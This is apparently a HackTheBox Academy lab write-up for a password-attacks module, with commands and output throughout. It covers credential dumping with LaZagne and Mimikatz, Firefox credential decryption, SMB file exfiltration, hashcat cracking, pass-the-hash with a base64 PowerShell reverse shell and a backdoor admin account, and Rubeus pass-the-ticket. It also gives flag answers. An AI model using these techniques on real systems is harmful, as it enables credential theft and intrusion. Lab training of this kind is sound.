![](./attachments/Pasted%20image%2020230206202053.png)

**Answer:** `3z1ePfGbjWPsTfCsZfjy`

### Question:
![](./attachments/Pasted%20image%2020230206201648.png)
*Hint: Try using the 3rd party tool discussed in the section. Consider ways to transfer that tool to the target.*

```
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

[+] System masterkey decrypted for 55030318-cf78-4fa0-a3a3-29749ac5e63b
[+] System masterkey decrypted for cbf5956a-5229-4238-838f-222660dc77e9
[+] System masterkey decrypted for 6a505802-6b1c-4420-bcb1-5085b201d5c0
[+] System masterkey decrypted for 83c23bf4-30df-4c94-96d6-e2c4cfcc74b2
[+] System masterkey decrypted for 66c0784c-3191-4a2b-92e3-78e4d7986659

########## User: SYSTEM ##########

------------------- Hashdump passwords -----------------

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::

------------------- Lsa_secrets passwords -----------------

NL$KM
0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
0010   E4 FE 18 4B 25 46 81 18 BF 23 F5 A3 2A E8 36 97    ...K%F...#..*.6.
0020   6B A4 92 B3 A4 32 DE B3 91 17 46 B8 EC 63 C4 51    k....2....F..c.Q
0030   A7 0C 18 26 E9 14 5A A2 F3 42 1B 98 ED 0C BD 9A    ...&..Z..B......
0040   0C 1A 1B EF AC B3 76 C5 90 FA 7B 56 CA 1B 48 8B    ......v...{V..H.
0050   32 B3 2C 95 2E 46 50 5A 46 F7 6E 53 66 FB DA 53    2.,..FPZF.nSf..S

DPAPI_SYSTEM
0000   01 00 00 00 C0 3A 4A 9B 2C 04 5E 54 55 43 F3 DC    .....:J.,.^TUC..
0010   B9 C1 81 BB 17 D6 BD CE 50 B9 FA 0F D7 94 52 15    ........P.....R.
0020   01 11 35 73 08 74 8F 7C A1 01 94 4A                ..5s.t.|...J



########## User: bob ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: 10.129.202.64
Login: ubuntu
Password: FSadmin123
Port: 22

```

user:pass `ubuntu:FSadmin123`

**Answer:** `ubuntu:FSadmin123`

### Question:
![](./attachments/Pasted%20image%2020230206201657.png)
*Hint: Sometimes automation can create security issues. Maybe Bob left some interesting scripts laying around.....*

![](./attachments/Pasted%20image%2020230206205004.png)

pass `Inlanefreightisgreat2022`

**Answer:** `Inlanefreightisgreat2022`

### Question:
![](./attachments/Pasted%20image%2020230206201708.png)
*Hint: Ansible sure is a powerful automation engine......*

![](./attachments/Pasted%20image%2020230206205153.png)

user:pass `edgeadmin:Edge@dmin123!`

**Answer:** `edgeadmin:Edge@dmin123!`

---
## Credential Hunting in Linux
### Question:
![](./attachments/Pasted%20image%2020230207103534.png)
*Hint: Sometimes, we will not have any initial credentials available, and as the last step, we will need to bruteforce the credentials to available services to get access. From other hosts on the network, our colleagues were able to identify the user "Kira", who in most cases had SSH access to other systems with the password "LoveYou1". We have already provided a prepared list of passwords in the "Resources" section for simplicity's purpose.*

Create a mutated list of `LoveYou1` using the `custom.rules` file. 

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/CredentialHuntinginLinux]
└─$ echo "LoveYou1" > passwd.list

┌──(kali㉿kali)-[~/HTB/PasswordAttacks/CredentialHuntinginLinux]
└─$ hashcat --force passwd.list -r Password-Attacks/Password-Attacks/custom.rule --stdout | sort -u > mut_password.list

┌──(kali㉿kali)-[~/HTB/PasswordAttacks/CredentialHuntinginLinux]
└─$ crackmapexec ssh 10.129.214.33 -u kira -p mut_password.list
SSH         10.129.214.33   22     10.129.214.33    [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.4
SSH         10.129.214.33   22     10.129.214.33    [-] kira:L0vey0u1 Authentication failed.
SSH         10.129.214.33   22     10.129.214.33    [+] kira:L0vey0u1! 
```

user:pass `kira:L0vey0u1!`

SSH into the box.

```
kira@nix01:~$ cat .bash_history 
cd
git clone https://github.com/unode/firefox_decrypt.git
cd firefox_decrypt/
ls
./firefox_decrypt.py 
su
./firefox_decrypt.py 
python3.9 firefox_decrypt.py 
cd ..
rm -rf firefox_decrypt/
vim .bash_history 
su
firefox 
su
firefox 
cd .mozilla/firefox/
ls
cd ytb95ytb.default-release/
ls
cat logins.json 
vim logins.json
```

We see there has been work done on firefox profile.

We need to set up an SMB server on the attack host so we can upload the data from the victim host.

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/CredentialHuntinginLinux]
└─$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/kali/HTB/PasswordAttacks/CredentialHuntinginLinux/SMBshare 
[sudo] password for kali: 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Then connect and upload the files.

```
kira@nix01:~$ smbclient //10.10.15.61/CompData -U kali
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> put .mozilla*
.mozilla* does not exist
```

We need to rename tile mozilla file so it is no longer hidden, then upload.

```
smb: \> !mv .mozilla/ mozilla/
smb: \> mput mozilla*
putting file mozilla/firefox/ytb95ytb.default-release/compatibility.ini as \mozilla\firefox\ytb95ytb.default-release\compatibility.ini (1.5 kb/s) (average 1.5 kb/s)
(...)
```

Then clone and run firefox_decrypt.py

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/CredentialHuntinginLinux]
└─$ git clone https://github.com/unode/firefox_decrypt
Cloning into 'firefox_decrypt'...
remote: Enumerating objects: 1163, done.
remote: Counting objects: 100% (275/275), done.
remote: Compressing objects: 100% (40/40), done.
remote: Total 1163 (delta 250), reused 238 (delta 233), pack-reused 888
Receiving objects: 100% (1163/1163), 414.55 KiB | 276.00 KiB/s, done.
Resolving deltas: 100% (732/732), done.

┌──(kali㉿kali)-[~/HTB/PasswordAttacks/CredentialHuntinginLinux]
└─$ cd firefox_decrypt 

┌──(kali㉿kali)-[~/HTB/PasswordAttacks/CredentialHuntinginLinux/firefox_decrypt]
└─$ ls
AUTHORS  CHANGELOG.md  firefox_decrypt.py  LICENSE  README.md  tests

┌──(kali㉿kali)-[~/HTB/PasswordAttacks/CredentialHuntinginLinux/firefox_decrypt]
└─$ ./firefox_decrypt.py ~/HTB/PasswordAttacks/CredentialHuntinginLinux/SMBshare/mozilla/firefox 
Select the Mozilla profile you wish to decrypt
1 -> lktd9y8y.default
2 -> ytb95ytb.default-release
2

Website:   https://dev.inlanefreight.com
Username: 'will@inlanefreight.htb'
Password: 'TUqr7QfLTLhruhVbCP'
```

user:pass `will:TUqr7QfLTLhruhVbCP`

**Answer:** `TUqr7QfLTLhruhVbCP`

---
## Passwd, Shadow & Opasswd
### Question:

Transfer the files via the SMB server like in preious questions.

```
will@nix01:~$ ls -lah
total 44K
drwxr-xr-x 7 will will 4.0K Feb  8 10:43 .
drwxr-xr-x 5 root root 4.0K Feb  9  2022 ..
drwxrwxr-x 2 will will 4.0K Feb  9  2022 .backups
-rw------- 1 will will   81 Feb  9  2022 .bash_history
-rw-r--r-- 1 will will  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 will will 3.7K Feb 25  2020 .bashrc
drwx------ 2 will will 4.0K Feb  8 10:25 .cache
drwx------ 3 will will 4.0K Feb  8 10:25 .config
drwxrwxr-x 3 will will 4.0K Feb  8 10:45 Downloads
drwxrwxr-x 3 will will 4.0K Feb  8 10:30 .local
-rw-r--r-- 1 will will  807 Feb 25  2020 .profile
will@nix01:~$ cd .backups/
will@nix01:~/.backups$ ls
passwd.bak  shadow.bak
will@nix01:~/.backups$ smbclient //10.10.15.61/CompData -U kali
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> put passwd.bak 
putting file passwd.bak as \passwd.bak (22.8 kb/s) (average 22.8 kb/s)
smb: \> put shadow.bak 
putting file shadow.bak as \shadow.bak (14.5 kb/s) (average 18.6 kb/s)
```

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/CredentialHuntinginLinux/SMBshare]
└─$ unshadow passwd.bak shadow.bak > unshadowed_hashes.txt

┌──(kali㉿kali)-[~/HTB/PasswordAttacks/CredentialHuntinginLinux/SMBshare]
└─$ cat unshadowed_hashes.txt 
root:$6$XePuRx/4eO0WuuPS$a0t5vIuIrBDFx1LyxAozOu.cVaww01u.6dSvct8AYVVI6ClJmY8ZZuPDP7IoXRJhYz4U8.DJUlilUw2EfqhXg.:0:0:root:/root:/bin/bash
daemon:*:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:*:2:2:bin:/bin:/usr/sbin/nologin
sys:*:3:3:sys:/dev:/usr/sbin/nologin
(...)
```

Since the user we are looking for is `root` we will delete all other entries to speed up the  process.

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/CredentialHuntinginLinux/SMBshare]
└─$ cat unshadowed_hashes.txt 
root:$6$XePuRx/4eO0WuuPS$a0t5vIuIrBDFx1LyxAozOu.cVaww01u.6dSvct8AYVVI6ClJmY8ZZuPDP7IoXRJhYz4U8.DJUlilUw2EfqhXg.:0:0:root:/root:/bin/bash
```

Lastly run hashcat to crack the hash.

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/CredentialHuntinginLinux/SMBshare]
└─$ hashcat -m 1800 -a 0 unshadowed_hashes.txt ~/HTB/PasswordAttacks/CredentialHuntinginLinux/mut_password.list -o unshadowed_cracked.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-AMD Ryzen 9 3900X 12-Core Processor, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Uses-64-Bit

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /home/kali/HTB/PasswordAttacks/CredentialHuntinginLinux/mut_password.list
* Passwords.: 94044
* Bytes.....: 1034072
* Keyspace..: 94044

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s
  
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$XePuRx/4eO0WuuPS$a0t5vIuIrBDFx1LyxAozOu.cVaww01u...fqhXg.
Time.Started.....: Wed Feb  8 06:40:55 2023 (49 secs)
Time.Estimated...: Wed Feb  8 06:41:44 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/kali/HTB/PasswordAttacks/CredentialHuntinginLinux/mut_password.list)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      889 H/s (7.38ms) @ Accel:128 Loops:256 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 43520/94044 (46.28%)
Rejected.........: 0/43520 (0.00%)
Restore.Point....: 43392/94044 (46.14%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4864-5000
Candidate.Engine.: Device Generator
Candidates.#1....: j0rd@n06! -> J0rd@n83!
Hardware.Mon.#1..: Util: 92%

Started: Wed Feb  8 06:40:54 2023
Stopped: Wed Feb  8 06:41:45 2023

┌──(kali㉿kali)-[~/HTB/PasswordAttacks/CredentialHuntinginLinux/SMBshare]
└─$ cat unshadowed_cracked.txt 
$6$XePuRx/4eO0WuuPS$a0t5vIuIrBDFx1LyxAozOu.cVaww01u.6dSvct8AYVVI6ClJmY8ZZuPDP7IoXRJhYz4U8.DJUlilUw2EfqhXg.:J0rd@n5
```

user:pass `root:J0rd@n5`

**Answer:** `J0rd@n5`

---
## Pass the Hash (PtH)
### Question:
![](./attachments/Pasted%20image%2020230208191132.png)
*Hint: Impacket can be used for PTH.*

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/CredentialHuntinginLinux/SMBshare]
└─$ impacket-psexec administrator@10.129.135.12 -hashes :30B3783CE2ABF1AF70F77D0660CF3453                                         
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.129.135.12.....
[*] Found writable share ADMIN$
[*] Uploading file PlWmHrxL.exe
[*] Opening SVCManager on 10.129.135.12.....
[*] Creating service uWpq on 10.129.135.12.....
[*] Starting service uWpq.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd ..

C:\Windows> cd ..

C:\> type pth.txt
G3t_4CCE$$_V1@_PTH
```

**Answer:** `G3t_4CCE$$_V1@_PTH`

### Question:
![](./attachments/Pasted%20image%2020230208191208.png)
*Hint: If the registry value is set to 1, is not possible to perform PTH via RDP.*

Anser is found in section text.

**Answer:** `DisableRestrictedAdmin`

### Question:
![](./attachments/Pasted%20image%2020230208191238.png)

Via the `Impacket` session run the following command to enable RDP login via PtH. 

```

```

Run Mimikatz.

```
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
  
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::LogonPasswords full
Authentication Id : 0 ; 452855 (00000000:0006e8f7)
Session           : Service from 0
User Name         : david
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 2/8/2023 12:06:13 PM
SID               : S-1-5-21-3325992272-2815718403-617452758-1107
        msv :
         [00000003] Primary
         * Username : david
         * Domain   : INLANEFREIGHT
         * NTLM     : c39f2beb3d2ec06a62cb887fb391dee0
         * SHA1     : 2277c28035275149d01a8de530cc13b74f59edfb
         * DPAPI    : eaa6db50c1544304014d858928d9694f
```

**Answer:** `c39f2beb3d2ec06a62cb887fb391dee0`

./mimikatz.exe "privilege::debug" "sekurlsa::LogonPasswords full" "exit" | select-string ssw

### Question:
![](./attachments/Pasted%20image%2020230208191329.png)

Run this command in Mimikatz and a new window will appear.

```
mimikatz # sekurlsa::pth /user:david /rc4:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe
```

In the new window we can access the `\\DC01\` share.

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>dir \\DC01\
The specified path is invalid.

C:\Windows\system32>dir \\DC01\david
 Volume in drive \\DC01\david has no label.
 Volume Serial Number is B8B3-0D72

 Directory of \\DC01\david

07/14/2022  03:07 PM    <DIR>          .
07/14/2022  03:07 PM    <DIR>          ..
07/14/2022  03:07 PM                18 david.txt
               1 File(s)             18 bytes
               2 Dir(s)  18,265,006,080 bytes free

C:\Windows\system32>type \\DC01\david\david.txt
D3V1d_Fl5g_is_Her3
```

**Answer:** `D3V1d_Fl5g_is_Her3`

### Question:
![](./attachments/Pasted%20image%2020230208191339.png)

Exactly the same process as in the previous question.

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>type \\DC01\julio\julio.txt
JuL1()_SH@re_fl@g
```

**Answer:** `JuL1()_SH@re_fl@g`

### Question:
![](./attachments/Pasted%20image%2020230208191348.png)

Open PowerShell and run the commands.

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> cd ..
PS C:\Users> cd ..
PS C:\> cd tools
PS C:\tools> cd .\Invoke-TheHash\
PS C:\tools\Invoke-TheHash> ls


    Directory: C:\tools\Invoke-TheHash


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------        12/9/2018   6:38 AM         139584 Invoke-SMBClient.ps1
------        12/9/2018   6:38 AM         160376 Invoke-SMBEnum.ps1
------        12/9/2018   6:38 AM         149645 Invoke-SMBExec.ps1
------        12/9/2018   6:38 AM          12169 Invoke-TheHash.ps1
------        12/9/2018   6:38 AM           2400 Invoke-TheHash.psd1
------        12/9/2018   6:38 AM            312 Invoke-TheHash.psm1
------        12/9/2018   6:38 AM          97878 Invoke-WMIExec.ps1
------        12/9/2018   6:38 AM           1515 LICENSE.md
------        12/9/2018   6:38 AM          11584 README.md


PS C:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS C:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
VERBOSE: Service RUFWUFGNOELSXXPYVNDL created on 172.16.1.10
VERBOSE: [*] Trying to execute command on 172.16.1.10
[+] Command executed with service RUFWUFGNOELSXXPYVNDL on 172.16.1.10
VERBOSE: Service RUFWUFGNOELSXXPYVNDL deleted on 172.16.1.10
```

Generate a Powershell3 (Base64) reverse shell vith the help of [revshells.com](https://www.revshells.com/).

Before launching the payload we need to set up a `NetCat` listener.

```
PS C:\tools> .\nc.exe -lnvp 8001
listening on [any] 8001 ...
connect to [172.16.1.5] from (UNKNOWN) [172.16.1.10] 49750
```

Now execute the payload.

```
PS C:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAOAAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
[+] Command executed with process ID 2332 on DC01
```

`NetCat` has recieved a connection.

```
whoami
inlanefreight\julio
PS C:\Windows\system32> cd ..
PS C:\Windows> cd ..
PS C:\> dir

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/18/2022   8:19 AM                john
d-----        7/18/2022   8:54 AM                julio
d-----        2/25/2022  10:20 AM                PerfLogs
d-r---        10/6/2021   3:50 PM                Program Files
d-----        7/18/2022  11:00 AM                Program Files (x86)
d-----        10/6/2022   9:46 AM                SharedFolder
d-----        9/22/2022   1:19 PM                tools
d-r---        10/6/2022   6:46 AM                Users
d-----       10/10/2022   5:48 AM                Windows

PS C:\> cd julio
PS C:\julio> dir

    Directory: C:\julio

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/14/2022   4:12 PM             15 flag.txt

PS C:\julio> type flag.txt
JuL1()_N3w_fl@g
```

**Answer:** `JuL1()_N3w_fl@g`

---
## Pass the Ticket (PtT) from Windows
### Question:
![](./attachments/Pasted%20image%2020230209100322.png)

Use Mimikatz to harvest the kerberos tickets from the system.

```
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::tickets /export

Authentication Id : 0 ; 647270 (00000000:0009e066)
Session           : Service from 0
User Name         : MSSQL$MICROSOFT##WID
Domain            : NT SERVICE
Logon Server      : (null)
Logon Time        : 2/9/2023 4:05:40 AM
SID               : S-1-5-80-1184457765-4068085190-3456807688-2200952327-3769537534
(...)
```

The tickets will be exported to the working directory.

```
C:\tools>dir
 Volume in drive C has no label.
 Volume Serial Number is B8B3-0D72

 Directory of C:\tools

02/09/2023  04:06 AM    <DIR>          .
02/09/2023  04:06 AM    <DIR>          ..
10/07/2022  08:43 AM         8,230,912 chisel.exe
09/23/2022  12:51 PM    <DIR>          Invoke-TheHash
09/22/2022  12:12 PM         1,355,264 mimikatz.exe
09/22/2022  12:13 PM            45,272 nc.exe
09/22/2022  12:14 PM           440,832 Rubeus.exe
02/09/2023  04:06 AM             1,705 [0;3e4]-0-0-40a50000-MS01$@cifs-DC01.inlanefreight.htb.kirbi
02/09/2023  04:06 AM             1,703 [0;3e4]-0-1-40a50000-MS01$@DNS-dc01.inlanefreight.htb.kirbi
02/09/2023  04:06 AM             1,739 [0;3e4]-0-2-40a50000-MS01$@GC-DC01.inlanefreight.htb.kirbi
02/09/2023  04:06 AM             1,633 [0;3e4]-2-0-60a10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
02/09/2023  04:06 AM             1,633 [0;3e4]-2-1-40e10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
02/09/2023  04:06 AM             1,705 [0;3e7]-0-0-40a50000-MS01$@LDAP-DC01.inlanefreight.htb.kirbi
02/09/2023  04:06 AM             1,743 [0;3e7]-0-1-40a50000-MS01$@ldap-DC01.inlanefreight.htb.kirbi
02/09/2023  04:06 AM             1,633 [0;3e7]-2-0-40e10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
02/09/2023  04:06 AM             1,641 [0;653d9]-2-0-40e10000-julio@krbtgt-INLANEFREIGHT.HTB.kirbi
02/09/2023  04:06 AM             1,623 [0;65db5]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi
02/09/2023  04:06 AM             1,633 [0;666d5]-2-0-40e10000-david@krbtgt-INLANEFREIGHT.HTB.kirbi
              15 File(s)     10,090,671 bytes
               3 Dir(s)  17,964,822,528 bytes free
```

We found 3 users.

```
02/09/2023  04:06 AM             1,641 [0;653d9]-2-0-40e10000-julio@krbtgt-INLANEFREIGHT.HTB.kirbi
02/09/2023  04:06 AM             1,623 [0;65db5]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi
02/09/2023  04:06 AM             1,633 [0;666d5]-2-0-40e10000-david@krbtgt-INLANEFREIGHT.HTB.kirbi
```

**Answer:** `3`

### Question:
![](./attachments/Pasted%20image%2020230209100333.png)

Using Rubeus to Pass the Ticket.

```
C:\tools>Rubeus.exe ptt /ticket:[0;65db5]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: Import Ticket
[+] Ticket successfully imported!

C:\tools>dir \\DC01.inlanefreight.htb\john
 Volume in drive \\DC01.inlanefreight.htb\john has no label.
 Volume Serial Number is B8B3-0D72

 Directory of \\DC01.inlanefreight.htb\john

07/14/2022  06:25 AM    <DIR>          .
07/14/2022  06:25 AM    <DIR>          ..
07/14/2022  02:54 PM                30 john.txt
               1 File(s)             30 bytes
               2 Dir(s)  18,167,238,656 bytes free

C:\tools>type \\DC01.inlanefreight.htb\john\john.txt
Learn1ng_M0r3_Tr1cks_with_J0hn
```

**Answer:** `Learn1ng_M0r3_Tr1cks_with_J0hn`

### Question:
![](./attachments/Pasted%20image%2020230209100343.png)

```
C:\tools>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> cd ..
[DC01]: PS C:\Users\john> cd ..
[DC01]: PS C:\Users> cd ..
[DC01]: PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/18/2022   8:19 AM                john
d-----        7/18/2022   8:54 AM                julio
d-----        2/25/2022  10:20 AM                PerfLogs
d-r---        10/6/2021   3:50 PM                Program Files
d-----        7/18/2022  11:00 AM                Program Files (x86)
d-----        10/6/2022   9:46 AM                SharedFolder
d-----        9/22/2022   1:19 PM                tools
d-r---        10/6/2022   6:46 AM                Users
d-----       10/10/2022   5:48 AM                Windows


[DC01]: PS C:\> cd john
[DC01]: PS C:\john> dir


    Directory: C:\john


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/18/2022   8:20 AM             19 john.txt


[DC01]: PS C:\john> type john.txt
P4$$_th3_Tick3T_PSR
```

**Answer:** `P4$$_th3_Tick3T_PSR`

---
## Pass the Ticket (PtT) from Linux
### Question:
![](./attachments/Pasted%20image%2020230209121257.png)

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasstheTicketPtTfromWindows]
└─$ ssh david@inlanefreight.htb@10.129.155.248 -p 2222
The authenticity of host '[10.129.155.248]:2222 ([10.129.155.248]:2222)' can't be established.
ED25519 key fingerprint is SHA256:HfXWue9Dnk+UvRXP6ytrRnXKIRSijm058/zFrj/1LvY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.129.155.248]:2222' (ED25519) to the list of known hosts.
david@inlanefreight.htb@10.129.155.248's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-128-generic x86_64)

(...)

Last login: Tue Oct 25 13:23:44 2022 from 172.16.1.5
david@inlanefreight.htb@linux01:~$ ls
flag.txt
david@inlanefreight.htb@linux01:~$ cat flag.txt
Gett1ng_Acc3$$_to_LINUX01
```

**Answer:** `Gett1ng_Acc3$$_to_LINUX01`

### Question:
![](./attachments/Pasted%20image%2020230209121310.png)
*Hint: There's a tool used to connect a Linux machine to a Windows Active Directory.*

```
david@inlanefreight.htb@linux01:~$ realm list
inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
